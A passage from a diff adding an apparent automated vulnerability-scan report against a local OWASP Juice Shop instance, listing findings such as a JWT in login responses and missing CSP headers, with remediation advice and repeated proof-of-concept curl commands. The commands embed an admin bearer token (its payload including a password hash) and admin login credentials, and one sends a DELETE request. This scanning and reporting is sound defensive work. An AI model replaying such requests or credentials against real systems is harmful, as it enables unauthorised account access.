+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Remove secrets and sensitive personal data from responses. Store secrets in a vault, redact error details in production, minimize PII returned by APIs, and ensure tokens and keys are rotated if exposure is confirmed.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the PoC request.
+2. Confirm the sensitive value appears in the response.
+3. Verify whether the current user is authorized to see that value.
+4. For secrets, assume exposure until the owning service confirms otherwise.
+
+## IF AMBIGUOUS
+
+- Suppress expected self-profile PII only when the page belongs to the same user.
+- Validate credit-card-like numbers with Luhn before reporting.
+- Ignore minified JavaScript and image payload entropy noise.
+
+## CLEANUP
+
+Rotate exposed secrets and remove sensitive data from logs or caches if confirmed.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>data</td><td>Sensitive Data Exposure (Jwt In Response) — http://localhost:3000/rest/user/login<br><small>high confidence</small></td><td>JWT found in response body or cookie.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Remove secrets and sensitive personal data from responses. Store secrets in a vault, redact error details in production, minimize PII returned by APIs, and ensure tokens and keys are rotated if exposure is confirmed.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the PoC request.
+2. Confirm the sensitive value appears in the response.
+3. Verify whether the current user is authorized to see that value.
+4. For secrets, assume exposure until the owning service confirms otherwise.
+
+## IF AMBIGUOUS
+
+- Suppress expected self-profile PII only when the page belongs to the same user.
+- Validate credit-card-like numbers with Luhn before reporting.
+- Ignore minified JavaScript and image payload entropy noise.
+
+## CLEANUP
+
+Rotate exposed secrets and remove sensitive data from logs or caches if confirmed.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/api/Addresss<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/api/BasketItems/{id}<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/api/Quantitys/<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/api/Recycles/<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
